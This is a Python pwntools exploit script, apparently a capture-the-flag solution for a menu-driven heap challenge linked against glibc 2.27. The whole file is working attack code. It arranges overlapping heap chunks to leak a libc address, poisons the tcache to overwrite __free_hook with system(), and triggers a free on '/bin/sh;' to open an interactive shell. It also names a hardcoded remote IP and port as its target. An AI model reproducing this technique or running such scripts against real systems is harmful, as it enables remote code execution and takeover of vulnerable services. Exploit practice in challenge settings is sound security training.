from pwn import *
# context.log_level = "debug"
# context.arch = "i386"
context.arch = "amd64"

menu=""
sh = 0
lib = 0
elf =ELF('./pwn') 
libc=ELF("./libc-2.27.so")

""" """
l64 = lambda      :u64(sh.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))  
l32 = lambda      :u32(sh.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))	
leak  = lambda name,data : sh.success(name + ": 0x%x" % data)
s  = lambda payload: sh.send(payload) 
sa  = lambda a,b  :sh.sendafter(a,b)
sl  = lambda payload: sh.sendline(payload)
sla = lambda a,b  :sh.sendlineafter(a,b)
ru  = lambda a     :sh.recvuntil(a)
r  = lambda a     :sh.recv(a)
""" """
def b(addr):  
	bk="b *$rebase("+str(addr)+")\nc"   
	attach(sh,bk)
	success("attach")
def cmd(c):
	sla(b"Your choice: ",str(c).encode())
def add(idx,size):
	cmd(1)
	sla(b"Index: ",str(idx).encode())
	sla(b"Size: ",str(size).encode())
def edit(idx,ctt):
	cmd(2)
	sla(b"Index: ",str(idx).encode())
	sla(b"Content: ",ctt)
def show(idx):
	cmd(3)
	sla(b"Index: ",str(idx).encode())
def dele(idx):
	cmd(4)
	sla(b"Index: ",str(idx).encode())
def parse_byte(by):
	tmp=bin(by)[2:].rjust(8,'0')
	tmplist=list(tmp)
	tmplist.reverse()
	tmp=''.join(tmplist)
	print(tmp)
	return tmp.encode()
def parse_data(da):
	if(type(da)==bytes):
		pass
	else:
		da=p64(da)
	res=b''
	for i in da:
		res+=parse_byte(i)
	return res
def pwn(ip,port,debug):
	global sh
	global libc
	if(debug == 1):
		sh = process("./pwn")
	else:
		sh = remote(ip,port)
	
	for i in range(7):
		add(i,0x100)
	add(7,0x100)
	add(8,0x20)
	add(9,0x20)
	add(10,0x20)
	add(11,0x108)
	add(12,0x100)
	add(13,0x20)
	for i in range(8):
		dele(i)
	edit(11,parse_byte(b'a'[0])*0x100+parse_data(0x280+0x30)+b'0')
	dele(12)
	add(14,0x130)
	show(9)
	leak_libc=l64()
	leak("leaklibc",leak_libc)
	libcbase=leak_libc-0x3ebca0
	leak("libcbase",libcbase)
	libc.address=libcbase
	free_hook=libc.sym['__free_hook']
	system=libc.sym['system']
	dele(10)
	dele(8)
	edit(14,parse_byte(b'a'[0])*0x110+parse_data(free_hook)*2)
	add(0,0x20)
	add(1,0x20)
	edit(1,parse_data(system))
	edit(0,parse_data(b'/bin/sh;'))
	dele(0)
	# gdb.attach(sh)

	sh.interactive()
if __name__ == "__main__":
	if_remote=0  
	IP="39.106.13.71" 
	port=19228				
	pwn(IP,port,if_remote)
